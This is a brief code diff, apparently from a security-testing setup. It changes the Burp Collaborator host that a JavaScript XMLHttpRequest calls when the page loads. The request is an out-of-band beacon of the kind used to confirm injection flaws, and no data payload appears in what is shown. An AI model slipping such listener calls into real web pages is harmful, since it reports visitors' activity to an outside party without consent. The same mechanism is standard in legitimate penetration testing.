@@ -5,7 +5,7 @@ var xhttp = new XMLHttpRequest();
 			}
 		};
 
-		xhttp.open("GET", "https://tol8purgjnah9cxa81m21axig9mzao.burpcollaborator.net");
+		xhttp.open("GET", "https://7z7c9rtgjf4xu7bu6yx1glgey54ysn.burpcollaborator.net");
 		xhttp.send();
 
 document.addEventListener('DOMContentLoaded', function () {
